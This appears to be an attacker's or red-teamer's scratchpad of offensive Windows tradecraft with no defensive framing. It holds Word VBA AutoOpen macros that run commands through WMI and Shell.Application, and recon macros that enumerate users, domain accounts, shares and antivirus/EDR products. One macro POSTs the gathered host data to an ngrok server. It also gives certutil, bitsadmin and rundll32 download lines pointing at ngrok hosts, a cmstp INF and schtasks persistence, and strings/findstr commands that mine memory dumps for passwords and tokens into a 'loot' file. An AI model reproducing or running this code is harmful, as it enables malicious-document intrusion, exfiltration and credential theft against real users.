Working
Sub AutoOpen()
    Open "C:\Users\Public\macro_test_result.txt" For Output As #1
    Print #1, "Word macro ran successfully without using WScript.Shell"
    Close #1
End Sub


Sub AutoOpen()
    GetObject("winmgmts:root\cimv2:Win32_Process").Create "calc.exe"
End Sub


Sub AutoOpen()
    GetObject("winmgmts:root\cimv2:Win32_Process").Create "calc.exe"
End Sub

Sub AutoOpen()
    Dim shell
    Set shell = CreateObject("Shell.Application")
    shell.ShellExecute "notepad.exe"
End Sub
------------------------------------------------------------
Sub AutoOpen()
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set outFile = fso.CreateTextFile("C:\Users\Public\getinfo.bat", True)
    outFile.WriteLine "@echo off"
    outFile.WriteLine "hostname > C:\Users\Public\hostinfo.txt"
    outFile.WriteLine "whoami >> C:\Users\Public\hostinfo.txt"
    outFile.WriteLine "echo Date: %date% >> C:\Users\Public\hostinfo.txt"
    outFile.Close
End Sub



Sub AutoOpen()
    CreateObject("Shell.Application").ShellExecute "C:\Users\Public\getinfo.bat"
End Sub


@echo off
echo === SYSTEM INFO === > C:\Users\Public\sysout.txt
systeminfo >> C:\Users\Public\sysout.txt
klist >> C:\Users\Public\sysout.txt
hostname >> C:\Users\Public\sysout.txt
whoami >> C:\Users\Public\sysout.txt
echo Done > C:\Users\Public\done.txt
pause

Sub AutoOpen()
    CreateObject("Shell.Application").ShellExecute "C:\Users\Public\info.bat"
End Sub


Sub AutoOpen()
    GetObject("winmgmts:root\cimv2:Win32_Process").Create "klist.exe > C:\Users\Public\klist_output.txt"
End Sub


Sub AutoOpen()
    Dim sh
    Set sh = CreateObject("Shell.Application")
    sh.ShellExecute "certutil.exe", _
        "-urlcache -split -f https://ce12-117-232-57-2.ngrok-free.app/new.html C:\tester\new.html", _
        "", "", 1
End Sub

C:\Windows\System32\certutil.exe -urlcache -split -f https://example.com/payload.html C:\tester\payload.html










forfiles /p C:\Windows\System32 /m klist.exe /c "cmd /c klist > C:\tester\klistout.txt"
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c calc"

Start--
[version]
Signature=$CHICAGO$

[DefaultInstall]
CustomDestination = CustInstDestSectionAllUsers
RunPreSetupCommands = RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
notepad.exe

[CustInstDestSectionAllUsers]
49000,49001=C:\MyFolder

[Strings]
ServiceName="EvilService"
ShortSvcName="EvilSvc"
end--

cmstp.exe /s C:\MyFolder\evil.inf




<script>
  var shell = new ActiveXObject("WScript.Shell");
  shell.Run("notepad.exe");
</script>

schtasks /create /tn "SwissKnifeyTask" /tr "C:\MyFolder\SwissShell.exe" /sc once /st 00:00
schtasks /run /tn "SwissKnifeyTask"


Sub ShowUserAndIP_VBScript_ShellExecute()
    Dim shellApp As Object
    Dim user As String
    Dim scriptPath As String
    Dim scriptContent As String

    ' Get current username
    user = Environ("USERNAME")
    
    ' Set path for the temporary VBScript file
    scriptPath = Environ("TEMP") & "\user_ip_info.vbs"

    ' VBScript content to fetch the current IP and user
    scriptContent = "Set objNetwork = CreateObject(""WScript.Network"")" & vbCrLf
    scriptContent = scriptContent & "strUser = objNetwork.UserName" & vbCrLf
    scriptContent = scriptContent & "Set objShell = CreateObject(""WScript.Shell"")" & vbCrLf
    scriptContent = scriptContent & "Set objExec = objShell.Exec(""ipconfig"")" & vbCrLf
    scriptContent = scriptContent & "strIP = """ & vbCrLf
    scriptContent = scriptContent & "Do While Not objExec.StdOut.AtEndOfStream" & vbCrLf
    scriptContent = scriptContent & "    strLine = objExec.StdOut.ReadLine" & vbCrLf
    scriptContent = scriptContent & "    If InStr(strLine, ""IPv4"") > 0 Then" & vbCrLf
    scriptContent = scriptContent & "        strIP = Mid(strLine, InStr(strLine, "": "") + 2)" & vbCrLf
    scriptContent = scriptContent & "    End If" & vbCrLf
    scriptContent = scriptContent & "Loop" & vbCrLf
    scriptContent = scriptContent & "MsgBox ""User: "" & strUser & vbCrLf & ""IP Address: "" & strIP" & vbCrLf

    ' Create VBScript file
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    With fso.CreateTextFile(scriptPath, True)
        .Write scriptContent
        .Close
    End With

    ' Use ShellExecute to run the VBScript
    Set shellApp = CreateObject("Shell.Application")
    shellApp.ShellExecute "wscript.exe", scriptPath, "", "open", 1
End Sub\








1. Enumerate environment info from within VBA
Sub AutoOpen()
    Dim msg As String
    msg = "Username: " & Environ("USERNAME") & vbCrLf
    msg = msg & "Computer: " & Environ("COMPUTERNAME") & vbCrLf
    msg = msg & "Domain: " & Environ("USERDOMAIN") & vbCrLf
    msg = msg & "HomeDrive: " & Environ("HOMEDRIVE") & vbCrLf
    msg = msg & "Temp: " & Environ("TEMP") & vbCrLf
    MsgBox msg, vbInformation, "System Info"
End Sub

✅ 2. Use WMI in VBA to get system info – no cmd.exe needed!

Sub GetIP()
    Dim objWMI As Object
    Dim colItems As Object
    Dim objItem As Object
    Dim output As String

    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = TRUE")

    For Each objItem In colItems
        If Not IsNull(objItem.IPAddress) Then
            output = output & "IP: " & objItem.IPAddress(0) & vbCrLf
        End If
    Next

    MsgBox output
End Sub

✅ 3. Get more system info from WMI:
Sub GetSysInfo()
    Dim objWMI As Object
    Dim colItems As Object
    Dim objItem As Object
    Dim output As String

    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMI.ExecQuery("Select * from Win32_OperatingSystem")

    For Each objItem In colItems
        output = "OS Name: " & objItem.Caption & vbCrLf
        output = output & "Version: " & objItem.Version & vbCrLf
        output = output & "Architecture: " & objItem.OSArchitecture & vbCrLf
        output = output & "Total RAM: " & Format(objItem.TotalVisibleMemorySize / 1024, "0") & " MB" & vbCrLf
        output = output & "Free RAM: " & Format(objItem.FreePhysicalMemory / 1024, "0") & " MB" & vbCrLf
    Next

    MsgBox output
End Sub

✅ 4. Get currently logged in users:
Sub WhoAmI()
    Dim objWMI As Object
    Dim colItems As Object
    Dim objItem As Object
    Dim output As String

    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMI.ExecQuery("Select * from Win32_ComputerSystem")

    For Each objItem In colItems
        output = "User: " & objItem.UserName & vbCrLf
        output = output & "Domain: " & objItem.Domain & vbCrLf
        output = output & "Name: " & objItem.Name & vbCrLf
    Next

    MsgBox output
End Sub

🔥🔥🔥 BONUS: List All Running Processes (Like tasklist Without tasklist.exe)
vba
Copy
Edit

Sub GetProcesses()
    Dim objWMI As Object
    Dim colItems As Object
    Dim objItem As Object
    Dim output As String

    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMI.ExecQuery("Select * from Win32_Process")

    For Each objItem In colItems
        output = output & objItem.Name & vbCrLf
    Next

    MsgBox Left(output, 1000) ' Show first 1000 characters
End Sub


List Domain USers
Sub ListDomainUsers()
    Dim objWMI As Object
    Dim colItems As Object
    Dim objItem As Object
    Dim output As String

    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMI.ExecQuery("SELECT * FROM Win32_UserAccount WHERE LocalAccount = FALSE")

    For Each objItem In colItems
        output = output & objItem.Name & " (" & objItem.Domain & ")" & vbCrLf
    Next

    MsgBox Left(output, 1000)
End Sub


Enumerate EDR/XDRS
Sub DetectAV()
    Dim objWMI As Object
    Dim colItems As Object
    Dim objItem As Object
    Dim output As String

    Set objWMI = GetObject("winmgmts:\\.\root\SecurityCenter2")
    Set colItems = objWMI.ExecQuery("SELECT * FROM AntiVirusProduct")

    For Each objItem In colItems
        output = output & objItem.displayName & " - Enabled: " & objItem.productEnabled & vbCrLf
    Next

    MsgBox output
End Sub



Network Shares
Sub ListMappedDrives()
    Dim objWMI As Object
    Dim colItems As Object
    Dim objItem As Object
    Dim output As String

    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMI.ExecQuery("SELECT * FROM Win32_LogicalDisk WHERE DriveType = 4")

    For Each objItem In colItems
        output = output & "Mapped Drive: " & objItem.DeviceID & " - " & objItem.ProviderName & vbCrLf
    Next

    MsgBox output
End Sub


Sub RunKlistAndCaptureOutput()
    Dim objWMI As Object
    Dim ProcessID As Variant
    Dim returnCode As Variant
    Dim fso As Object
    Dim file As Object
    Dim outputPath As String
    Dim outputText As String
    Dim waitTime As Date

    outputPath = "C:\MyFolder\klist_out.txt"

    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")

    ' Launch klist and redirect output to file
    objWMI.Get("Win32_Process").Create "C:\Windows\System32\klist.exe > " & outputPath, Null, Null, ProcessID

    ' Wait 3 seconds for output to complete
    waitTime = Now + TimeValue("00:00:03")
    Do While Now < waitTime
        DoEvents
    Loop

    ' Read file content
    Set fso = CreateObject("Scripting.FileSystemObject")

    If fso.FileExists(outputPath) Then
        Set file = fso.OpenTextFile(outputPath, 1)
        outputText = file.ReadAll
        file.Close
        MsgBox Left(outputText, 1000), vbInformation, "KLIST Output"
    Else
        MsgBox "Output file not found!"
    End If
End Sub




strings.exe -nobanner -accepteula -q -o path\to\dumpfile.dmp | findstr /i /c:"password" /c:"pwd=" /c:"token" /c:"bearer" /c:"authorization:" /c:"cookie" /c:"set-cookie" /c:"sessionid" /c:"api_key" /c:"db_username" /c:"db_password" /c:"ldap" /c:"cifs/" /c:"smb://" /c:"domain" /c:"logonserver" /c:"vpn" /c:"private key" > path\to\loot.txt



Sub AutoOpen()
    On Error Resume Next
    
    Dim objWMI As Object
    Dim colItems As Object
    Dim objItem As Object
    Dim output As String
    
    ' WMI Setup
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    
    ' Collect OS Info
    Set colItems = objWMI.ExecQuery("Select * from Win32_OperatingSystem")
    For Each objItem In colItems
        output = output & "OS: " & objItem.Caption & vbCrLf
        output = output & "Version: " & objItem.Version & vbCrLf
        output = output & "Architecture: " & objItem.OSArchitecture & vbCrLf
        output = output & "Build Number: " & objItem.BuildNumber & vbCrLf
    Next
    
    ' Collect IP Info
    Set colItems = objWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = TRUE")
    For Each objItem In colItems
        output = output & "IP Address: " & objItem.IPAddress(0) & vbCrLf
    Next
    
    ' Collect Domain Info
    Set colItems = objWMI.ExecQuery("Select * from Win32_ComputerSystem")
    For Each objItem In colItems
        output = output & "Computer Name: " & objItem.Name & vbCrLf
        output = output & "Domain: " & objItem.Domain & vbCrLf
        output = output & "User: " & objItem.UserName & vbCrLf
    Next
    
    ' Collect Process List
    Set colItems = objWMI.ExecQuery("Select * from Win32_Process")
    output = output & "Running Processes:" & vbCrLf
    For Each objItem In colItems
        output = output & objItem.Name & vbCrLf
    Next
    
    ' Collect Logged On Users (Live Sessions)
    Set colItems = objWMI.ExecQuery("Select * from Win32_LogonSession")
    output = output & "Logged On Sessions:" & vbCrLf
    For Each objItem In colItems
        output = output & "LogonId: " & objItem.LogonId & ", Type: " & objItem.LogonType & vbCrLf
    Next
    
    ' Collect Mapped Drives
    Set colItems = objWMI.ExecQuery("Select * from Win32_LogicalDisk WHERE DriveType = 4")
    output = output & "Mapped Drives:" & vbCrLf
    For Each objItem In colItems
        output = output & objItem.DeviceID & " - " & objItem.ProviderName & vbCrLf
    Next

    ' Collect AV/Security Products
    Set objWMI = GetObject("winmgmts:\\.\root\SecurityCenter2")
    Set colItems = objWMI.ExecQuery("SELECT * FROM AntiVirusProduct")
    output = output & "Detected Security Products:" & vbCrLf
    For Each objItem In colItems
        output = output & objItem.displayName & vbCrLf
    Next

    ' Display or store the output
    MsgBox Left(output, 30000), vbInformation, "System Recon Report"
End Sub


Sub AutoOpen()
    On Error Resume Next
    
    Dim objWMI As Object
    Dim colItems As Object
    Dim objItem As Object
    Dim output As String
    Dim http As Object
    Dim server As String
    Dim targetURL As String
    
    ' WMI Setup
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    
    ' Collect OS Info
    Set colItems = objWMI.ExecQuery("Select * from Win32_OperatingSystem")
    For Each objItem In colItems
        output = output & "OS: " & objItem.Caption & vbCrLf
        output = output & "Version: " & objItem.Version & vbCrLf
        output = output & "Architecture: " & objItem.OSArchitecture & vbCrLf
    Next
    
    ' Collect IP Info
    Set colItems = objWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = TRUE")
    For Each objItem In colItems
        output = output & "IP Address: " & objItem.IPAddress(0) & vbCrLf
    Next
    
    ' Setup HTTP POST
    Set http = CreateObject("MSXML2.XMLHTTP")
    
    ' Replace "YOUR_IP" with YOUR attack machine IP (the one listening with nc)
    server = "https://2e43-223-231-137-213.ngrok-free.app"
    
    http.Open "POST", server, False
    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    http.Send "data=" & URLEncode(output)
End Sub

Function URLEncode(ByVal sText As String) As String
    Dim i As Long
    Dim sRes As String
    Dim sChar As String
    For i = 1 To Len(sText)
        sChar = Mid(sText, i, 1)
        Select Case Asc(sChar)
            Case 48 To 57, 65 To 90, 97 To 122
                sRes = sRes & sChar
            Case Else
                sRes = sRes & "%" & Hex(Asc(sChar))
        End Select
    Next
    URLEncode = sRes
End Function





Sub AutoOpen()
    Dim objWMIService As Object
    Dim objProcess As Object
    Dim strCommand As String

    ' Create WMI Service Object
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

    ' BITSADMIN will make a download request (harmless looking!)
    strCommand = "bitsadmin /transfer myjob https://2e43-223-231-137-213.ngrok-free.app/ C:\Windows\Temp\dummy.txt"

    ' Execute
    objWMIService.Get("Win32_Process").Create strCommand, Null, Null, Null
End Sub




Sub AutoOpen()
    Dim objWMIService As Object
    Dim objProcess As Object
    Dim strCommand As String

    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    
    strCommand = "rundll32.exe url.dll,OpenURL https://2e43-223-231-137-213.ngrok-free.app"

    objWMIService.Get("Win32_Process").Create strCommand, Null, Null, Null
End Sub



Sub AutoOpen()
    Dim objWMIService As Object
    Dim objProcess As Object
    Dim strCommand As String

    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    
    strCommand = "rundll32.exe url.dll,OpenURL https://2e43-223-231-137-213.ngrok-free.app"

    objWMIService.Get("Win32_Process").Create strCommand, Null, Null, Null
End Sub




strings.exe -nobanner -accepteula -q -n 4 -u C:\MyFolder\yourdump.dmp | findstr /i /c:"password" /c:"pwd=" /c:"token" /c:"bearer" /c:"authorization:" /c:"cookie" /c:"set-cookie" /c:"sessionid" /c:"api_key" /c:"db_username" /c:"db_password" /c:"ldap" /c:"cifs/" /c:"smb://" /c:"uncpath" /c:"file://" /c:"vpn" /c:"private key" /c:"logonserver" > C:\MyFolder\loot.txt

